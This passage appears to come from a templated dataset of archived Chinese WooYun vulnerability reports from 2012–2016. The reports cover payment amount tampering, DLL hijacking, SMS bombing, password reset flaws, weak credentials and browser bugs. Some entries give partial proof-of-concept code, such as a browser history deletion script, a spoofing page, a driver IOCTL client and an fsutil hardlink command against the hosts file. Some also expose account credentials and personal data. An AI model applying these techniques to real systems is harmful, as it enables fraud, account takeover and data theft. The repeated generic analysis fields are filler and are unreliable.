**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 阿云浏览器对通过external接口实现浏览器功能的扩展，但是没有考虑接口的安全性。可通过Internet域访问external接口，并进行扩展功能的操作

**POC**: 在任意网站中嵌入<script>try{window.external.DeleteHistoryItem("https://example.com/[已脱敏]");window.external.QueryHistoryList(16);}catch(e){alert("error");}</script>可直接删除历史记录中的baidu条目<script>function OnTest(str){alert(str);}var ext = window.external;try{ext.SetCallback_OnQueryHistoryList(OnTest);ext.QueryHistoryL

**绕过**: 直接利用

**修复**: 控制访问域
---

---
### [wooyun-2013-037453] 360安全卫士DLL劫持无视自我保护（可用于提权或后门等）
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 当时360安全卫士默认安装路径为C:\Program Files\360\360Safe\测试时发现360主程序360Safe.exe和360其他程序都存在加载一处不存在的DLL文件，该名称为i18n.dll但这处不存在的DLL存在某安全厂商的360Safe目录下，由于360默认开启自我保护文件是无法写入的（除非关闭自我保护，再写入。我这里不需要用到这处路径劫持）。我们在这里发现360安全卫士木马防火墙模块360Tray.exe还会加载程序安装目录外的不存的DLL文件。（从而无视某安全厂商的自我保护）经尝试发现在系统这路径下“C:\Program Files\”写入一个名称为i18n.dll的DLL文件，在运行运行360Tray.exe时会自动加载i18n.dll最终发现在“C:\Program Files\”写入i18n.dll文件后，在360卫士每次开机时（也就是说防火墙每次开启时）都会自动加

**POC**: 来个视频吧https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2012-04834] 某互联网公司三国BUG、可瞬间点亮图标游戏人物达80级
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司三国有俩个区是体验服 ， 桃园结义是一个体验区有任务让你体验80级 ， 做任务体验80级JN装备的。 在进去之后做等级改变之后结束某互联网公司三国程序， 这样游戏人生就只记录了你的80级，之后你就最好别上这个角色了， 你就算上 也是原先的4级了最后等等级变成80级时侯 结束掉 某互联网公司SG.exe 程序。立即图标就会点亮，并且明天就可以直接等着游戏人生更新你的80级荣誉事件了*!关闭程序 用任务管理器关闭!

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0213804] 55BBS某系统设计逻辑缺陷涉及内部敏感信息(公司组织架构/员工福利薪资等)
**厂商**: 55bbs.com | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发现55bbs换了新邮箱系统https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0155798] 某鲜花速递商城支付漏洞
**厂商**: 某鲜花速递商城 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 随便选个商品，然后一步两步三四步进入提交付款页面点击进入支付时抓包（貌似只能招商网银支付，选某电商平台也提示用某银行付款），修改金额为1.00OK，进入某银行支付页面，付款金额成了1.00元

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你比我懂啊
---

---
### [wooyun-2013-023990] 深圳热线团购支付缺陷
**厂商**: 深圳热线 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 验证，求个邀请码谢谢:)
---

---
### [wooyun-2015-096693] 傲游浏览器依然存在可信任路径代码执行漏洞
**厂商**: 傲游 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原来报过一个（WooYun: 傲游浏览器可信任路径代码执行漏洞）， 而且厂商说“已经修复漏洞”......原链接中的遨游版本是4.4.1.5000，我测试使用的是4.4.4.2000:安装时弹出了三个来自安装文件根目录下的program.exe:

**POC**: 安装时弹出了三个来自安装文件根目录下的program.exe:

**绕过**: 直接利用

**修复**: 加上引号。
---

---
### [wooyun-2014-074698] 某电影网站存在支付漏洞（3）
**厂商**: 北京觅影文化发展有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 然后查看我的订单，果然是梦露啊！：再看看我的卡的剩余点数：

**绕过**: 直接利用

**修复**: 这个地址是坐等礼物的地址！！真的是友情检测，你可以不发货，不给礼物，但是不能查水表！！我原来卡上就23点，给我恢复就好，是我的谁都拿不走！！！累了，你们的网站漏洞太多，最好大修。。修改方式，参照大神的总结，里面有很多支付漏洞的典型案例，也有修复方式：https://example.com/[已脱敏]
---

---
### [wooyun-2014-053277] 利用某搜索引擎活动中接验证码的漏洞可制成短信轰炸
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏] 之后我们抓包一下!获得如下一串代码https://example.com/[已脱敏] 一直get 也可以挂上网页定时自动刷新.他就会一直无限的去发送!而后面的mobile=是可以随便修改的要发送的手机号码

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加发送时间隔验证
---

---
### [wooyun-2012-011113] 驴妈妈旅游网支付漏洞
**厂商**: 驴妈妈旅游网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 字符信息没有加合法性校验（签名），导致订单金额提交到网银时被篡改。

**POC**: https://example.com/[已脱敏] 支付页面直接修改参数然后直接跳到某国有银行网银了，没有测试能否返回成功支付，如果不能那就忽略吧。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-087451] 天天团购支付漏洞
**厂商**: 天天团购 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 商品提交ID存在逻辑缺陷，能用低价产品购买高价产品，还有的图插不上来，可以找我

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0158625] 航天信息股份有限公司某系统设计逻辑缺陷
**厂商**: 航天信息股份有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 航天信息股份有限公司某系统弱口令，用户名同密码相同https://example.com/[已脱敏]	liuwei	200	false	false	352942	lili	200	false	false	3529180	chenying	200	false	false	3529144	liubo	200	false	false	3529260	yanglin	200	false	false	3529388	wangkun	200	false	false	3529

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 增加验证码
---

---
### [wooyun-2013-036825] 某国有银行网银助手多处DLL劫持
**厂商**: 某国有银行 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时默认安装路径：C:\Program Files\ICBCEbankTools\ICBCSetupIntegrationICBCEBankAssist.exe运行时会加载多个不存在的DLL文件，如下：C:\Program Files\ICBCEbankTools\ICBCSetupIntegration\ICBCebankassistchs.dllC:\Program Files\ICBCEbankTools\ICBCSetupIntegration\ICBCebankassistcht.dllC:\Program Files\ICBCEbankTools\ICBCSetupIntegration\ICBCebankassistloc.dllC:\Program Files\ICBCEbankTools\ICBCSetupIntegration\atlcommonchs.dllC:\P

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2016-0165424] 中航物业设计逻辑缺陷导致邮件系统内部信息泄露
**厂商**: cncert国家互联网应急中心 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 弱口令前加上cmp就好了...抓取post信息成功爆破出账户成功登陆

**POC**: 弱口令前加上cmp就好了...抓取post信息成功爆破出账户成功登陆

**绕过**: 直接利用

**修复**: 验证、限制登陆次数
---

---
### [wooyun-2012-013454] 点点网小编申请机制存在漏洞。
**厂商**: 点点网 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 点点网的标签小编申请存在逻辑漏洞。审核小编的人应该只审核申请理由而没有去该博客阅读该标签的文章的质量。

**POC**: 这是我们一开始看到的审核标签的拒绝理由。在你的点点网博客点击批量编辑，如下图通过批量编辑给你的每篇文章加上该标签，增加标签在你的博客的密度以及热度。下面为增加成功的截图然后去申请该标签小编，通过系统审核，进入到点点网管理员审核阶段。为了防止该标签的现有小编和点点其他用户发现你的行为，再次回到批量编辑里，把刚加上的标签删除。-----------------可以看到 https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 1.在管理员审核标签小编时进入博客内了解相关文章是否存在及真实密度和质量【Q1:我为什么知道管理员没有进入我的博客查看相关文章？ A1：因为我的站长统计里没有该来路。】2.在系统判断申请小编时判断文章发布时间，比如不允许一个月内没发过该标签X篇文章的人申请小编。3.最重要的一点，该标签如果有小编，如
---

---
### [wooyun-2015-0160712] 珠海远光软件某系统设计逻辑缺陷导致公司信息泄漏、可任意更改用户资料
**厂商**: 远光软件 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: user ： chenlihao  123456

**POC**: 对参数进行遍历1-10000   发现好几千个用户然后写个脚本把所有用户邮箱爬下来接下来cookie欺骗来看下该公司任意谁的考勤信息等。。。冒充795在这里直接修改uid的话是可查看任意人的。继续修改资料、邮箱,这些===

**绕过**: 直接利用

**修复**: 你们懂的！
---

---
### [wooyun-2015-092893] 某搜索引擎云加速防御规则绕过
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 某搜索引擎云加速防御规则绕过这个漏洞发了一条https://example.com/[已脱敏]

**POC**: 修改一下原来的：https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: - -
---

---
### [wooyun-2015-0135015] 洋码头某处支付逻辑漏洞(低价购买商品)
**厂商**: 上海洋码头网络技术有限公司 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海洋码头存在严重漏洞，可低价购买商品，价格随你更改。https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 服务端应校验
---

---
### [wooyun-2013-045829] Google Chrome 31.0.1650.63伪造任意网站漏洞(需要用户交互)
**厂商**: Google | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、 打开此网页2、 然后在地址栏随便输入一个地址，最好是难以到达或者是不能打开（例如端口号不能打开）的，例如https://example.com/[已脱敏] onbeforeunload 和onmousemove综合作用可以导致页面写入内容，此时页面显示“加载状态”4、 HTTP 204请求完成，导致页面不显示加载圆圈，此时像是“加载完毕”5、 页面维持这个状态很长时间,定期重发请求会让页面一直显示这个

**POC**: <h1 id="msg">please type www.google.com:100 in the address bar to leave this page</h1><h1 id="spoof"></h1><script type="text/javascript">spoof.style.display = 'none';var done = 0;var got = 0;onbeforeunload = function(ev) {done = 1;return false;}onmousemove = function() {stop();if (done && !got) {msg

**绕过**: 直接利用

**修复**: 学学firefox和ie
---

---
### [wooyun-2012-07471] 国美网上商城支付漏洞1元订购Iphone 4S！
**厂商**: 国美控股集团 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我菜鸟一个，今天无意间看到国美商城搞的半价活动的广告才有幸进入国美商城。活动确实给力，但是额来的有点晚活动已经结束…… 闲逛中偶然发现这个漏洞。下面说下漏洞测试过程：选择商品：我分别选了一个26元和一个27元的U盘。然后我吧26这个U盘数量改成了 “-1” 结果商品总金额变成了1元。如图接下我选择了，在线支付，通过某电商平台付款1元。然后奇迹就出现了。PS:我看其他道友的有显示名字，我怎么没到注册账号的地方呢？

**POC**: 看来人工审核也是摆设。订单顺利通过审核已经进入了拣货阶段。2012-05-23 23:21:06您的订单正在拣货中。我疑惑的是，若是真发货了，这个价格为26数量为-1的U盘订单，他怎么办? 难道还要问我要个U盘回去？！订单在拣货中了……我已联系客服取消了订单。

**绕过**: 直接利用

**修复**: 菜鸟一个，不会修复，你们应该能很快搞定。
---

---
### [wooyun-2012-05586] 杂志铺网站存在支付漏洞
**厂商**: 杂志铺 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在支付漏洞，厂商如果来的话，在WOOYUN找找就是了；测试成功后给客服邮箱发了邮件；订单中有实际支付金额，不过可能订单审核人员，没见过这么怪的订单，或者审核太匆忙，居然审核通过了~~

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们懂的~
---

---
### [wooyun-2013-019961] 360浏览器的一个安全漏洞
**厂商**: 某安全厂商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 360浏览器高危漏洞，点击原页面打开攻击页面后可修改原页面，可应用于钓鱼，

**POC**: 在某搜索引擎搜索 www.baidu.com.hackworry.com:8000点击进入后，原某搜索引擎搜索页面被修改

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-061351] 360浏览器5.0及以下版本#存在CSS跨域漏洞
**厂商**: 某安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 360浏览器5.0及以下版本#存在CSS跨域漏洞下载了360浏览器5.0正式版测试了下- -.3.0等等也存在同样的漏洞，我就拿5.0开刀吧- -.

**POC**: 构造两个本地的页面：test.html<html><head><title>test</title></head><body>{}body{font-family:WooYun</body></html>test2.html<html><head><title>test2</title></head><body><style>@import url("C:\Users\Administrator\Desktop\test.html");</style><script>setTimeout(function(){var t = document.body.currentStyle.fontFam

**绕过**: 直接利用

**修复**: 补丁:)
---

---
### [wooyun-2015-092753] PPTV又又又一接口设计不当导致可暴力破解可撞库#4（账号主站通用+验证码绕过）
**厂商**: PPTV(PPlive) | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 书接上回，话说从前有个PPTV。。好吧正经点，PPTV的主站是有抓包限制的，然后又说到想这种大站一般都有很多子站点和很多登陆地址的，这个不行那我们就换其他的，第二发和第三发还比较容易，第四发好难额。。不过还是被我找到了那么一个登陆地址：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 我真的真的缺个移动硬盘放片子
---

---
### [wooyun-2015-0139817] 全国大学生数学建模竞赛系统业务沦陷（可进入任意参赛队伍和赛区管理员帐号）
**厂商**: 中国工业与应用数学学会 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先说明一下这个比赛：关于比赛系统的官方说明：

**POC**: url:http://**.**.**.**/问题在找回密码功能：点找回密码链接，然后抓包：密码出现！登录：可以想象问题的严重性，漏洞完全可以用于比赛作弊

**绕过**: 直接利用

**修复**: 比赛没几天就开始了，主办方自己快点解决啊
---

---
### [wooyun-2014-089152] 万达某站设计不当存在支付漏洞（证明支付成功收到订购成功短信）
**厂商**: 大连万达集团股份有限公司 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 手机收到成功的短信

**绕过**: 直接利用

**修复**: 对支付过程增强验证
---

---
### [wooyun-2013-037006] 某视频播放器M处DLL劫持
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试时默认的安装路径C:\Program Files\Tencent\某互联网公司Player某互联网公司Player.exe运行时会加载多处不存在的DLL文件（包括播放不一样格式的视频文件，加载不存在的DLL也不一样的）直接打开某互联网公司Player.exe会加载如下不存在的DLLC:\Program Files\Tencent\某互联网公司Player\某互联网公司playerchs.dllC:\Program Files\Tencent\某互联网公司Player\某互联网公司playercht.dllC:\Program Files\Tencent\某互联网公司Player\某互联网公司playerloc.dllC:\Program Files\Tencent\某互联网公司Player\mpadecfilterchs.dllC:\Program Files\Tencent\某互联网公司Player\mpadecfiltercht.dllC:\Program Files

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂！
---

---
### [wooyun-2014-080067] 南航分公司内部系统弱口令导致严重信息泄漏危害
**厂商**: 中国南方航空股份有限公司 | **年份**: 2014 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一数万旅客信息泄露，机票所有信息（身份证——电话——住址——航程——航班）可用于机票诈骗二任意操作他人机票订单，退票，三可以不要钱大量买机票，并且可以出票（屌丝的福利）四短信轰炸(可以任意发送短信）五黑屏功能好像很强大，航空公司内部查询系统，可看某重要领导行踪（放心 我啥都没做 就进来看了几眼）mask 区域1.http://**.**.**/asms/index.jsp账号801 密码123abc  系统太大 研究了好久。。。一，二，三，四， 机票—机票订单管理——查询，可以看到出票了吧 ，这应该出的真票，几千一张啊 ，我可不敢乱动点订票员可以看到订单吧  什么信息都有吧  ，在看订单下面 可发短信，退票，什么行程单什么的吧 ，退票的吧，有图为证。

**POC**: 右上角的黑屏好像很强大 航空公司内部系统？不过不会用参见某搜索引擎文库https://example.com/[已脱敏] 真有钱。。。。

**绕过**: 直接利用

**修复**: 只想20rank
---

---
### [wooyun-2012-013154] 易拍网充值漏洞，已成功支付
**厂商**: 易拍网 | **年份**: 2012 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先进入易拍网，网址：www.yeepai.com登陆账号点充值点击充值￥   1000   =    100000  拍点 + [ 赠送 20000 返点 + 再送 60元代金券 ] 的付款银行点击某国有银行，然后修改！将1000修改为1,，下面提示就成了充值1元，1百拍点了，但是充值完成之后的20000返点依然会默认为充值1000块钱的额度赠送，也就是我们充值1元钱就可以享受充值1000的待遇了！生成订单看看！赠送返点： 	20000点  果然是20000点！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我在易拍花了好多拍点啊，连个草都木有拍到一根，希望官方来点补偿奖励吧！
---

---
### [wooyun-2015-098955] 2345安全卫士驱动存在设计问题
**厂商**: 2345网址导航 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 2345安全卫士安装的2345powerapi.sys驱动程序，不会校验打开其设备对象的进程。导致任意具有打开设备对象权限的进程，都能使用其驱动中的功能。既然叫powerapi一定是很好很强大。我就试了一个关闭任意进程。其他的未测试。

**POC**: //#include <Windows.h>#define CONTROLCODE1 0x228000HANDLE OpenDevice(TCHAR *devName){HANDLE hDev = CreateFile(devName,GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);return hDev;}void CloseDevice(HANDLE hDev){CloseHandle(hDev);}int SendMessageToDev(HANDL

**绕过**: 直接利用

**修复**: 严格限制能使用本驱动的进程。
---

---
### [wooyun-2015-0114377] 盛大旗下起点商城存在支付漏洞
**厂商**: 盛大网络 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 商城本身的逻辑是很好的，（虽然可以生成负数金额但在支付时会报错，然后，，，没然后了），但是，可以让支付金额尽可能的小，比如花1块钱买200多的东西，具体如下。1.首先在商城里随便买点什么东西（至少两件商品）。这里的支付金额是65rmb（好贵），不过马上就可以打折了，吼吼~之后结算，这里要拦截下数据包，并把count参数改成-1（另一个count不变），不过需要注意的是，两个或多个订单，不论怎么改都不要使支付金额为负数否则支付会失败的，so~按照小学生算数  30+（-25）+10（邮费）=15，恩，最后金额应该是15块吧哦，果然是这样就算是负数的商品我收不到，可订单中有正数的商品，这个应该可以收到吧（原价25，现价15，还是赚），如果精心构造下，实现1元买200的商品应该不是什么难事吧。。

**POC**: 商城本身的逻辑是很好的，（虽然可以生成负数金额但在支付时会报错，然后，，，没然后了），但是，可以让支付金额尽可能的小，比如花1块钱买200多的东西，具体如下。1.首先在商城里随便买点什么东西（至少两件商品）。这里的支付金额是65rmb（好贵），不过马上就可以打折了，吼吼~之后结算，这里要拦截下数据包，并把count参数改成-1（另一个count不变），不过需要注意的是，两个或多个订单，不论怎么改都不要使支付金额为负数否则支付会失败的，so~按照小学生算数  30+（-25）+10（邮费）=15，恩，最后金额应该是15块吧哦，果然是这样就算是负数的商品我收不到，可订单中有正数的商品，这个应该可以

**绕过**: 直接利用

**修复**: 不要接受任何负数量商品   其他的 I don't known
---

---
### [wooyun-2014-060275] 一种几乎通杀各大厂商的文件防护绕过
**厂商**: 各大安全厂商 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 连发了两个防护绕过，鉴于发现此方法具有通用性，想了想还是单独把方法和思路发出来吧。为了避免刷rank之嫌，自评1。其实就是利用了NTFS的硬链接特性，利用同一个磁盘文件的不同文件名和路径来规避常规的安全软件检测。fsutil hardlink create c:\a.txt C:WINDOWS\system32\drivers\etc\hosts执行此命令后c:\a.txt与C:WINDOWS\system32\drivers\etc\hosts两个文件实际上是等价的，在硬盘上是同一个文件，只是拥有两个文件名而已，利用这一点可以绕过一些常规安全软件的防护。有了这个特性，我们就可以任意读写大多数文件了。

**POC**: 其实就是利用了NTFS的硬链接特性，利用同一个磁盘文件的不同文件名和路径来规避常规的安全软件检测。fsutil hardlink create c:\a.txt C:WINDOWS\system32\drivers\etc\hosts执行此命令后c:\a.txt与C:WINDOWS\system32\drivers\etc\hosts两个文件实际上是等价的，在硬盘上是同一个文件，只是拥有两个文件名而已，利用这一点可以绕过一些常规安全软件的防护。有了这个特性，我们就可以任意读写大多数文件了。下面是对某安全厂商的吐槽图：提交至360SRC时的证明截图：而昨晚的测试中，最新版360安全卫士变成了直接拦截

**绕过**: 过滤绕过

**修复**: 加强监控吧在这里顺便鄙视一下360，这个问题最早于05-09凌晨03:19:30提交至360SRC。于05-10 19:29被忽略，得到回复管理员非可信程序调用fsutil为关键文件创建硬链接的行为是会拦截的，你可以将你的cmd.exe修改几个字节再调用试试。于是又花了一夜对国内常见的安全卫士们都做
---

---
### [wooyun-2015-0112170] 途友app设计不当任意账号可被修改密码
**厂商**: 途友 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 设计错误/逻辑缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计错误/逻辑缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、app下载地址：https://example.com/[已脱敏]  : com.tuyou.travel, 250, 2.5.0, 途友apkmd5: ab7111b422881b312932ac8d042dfb5f证书 :certmd5: 29ea2e27f7d992ba1852a6e180df2937issuer: CN=tuyousubject: CN=tuyou

**POC**: 1、正常使用密码找回功能时输入验证码后服务器返回的数据。{"result":"{\"code\":200,\"value\":\"verifySmsCode\",\"data\":{\"status\":201}}"}2、因为是一个交友的app，所以得到了几个手机号：13104571678,13847005830.3、找回密码：4、随意输入验证码：123456，将服务器返回结果修改后在执行。5、进入密码修改界面：密码修改成功。密码均被修改为test1236、使用修改的密码登录账号。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0185833] 中国矿业大学的coremail邮箱任意密码重置
**厂商**: Coremail盈世信息科技（北京）有限公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

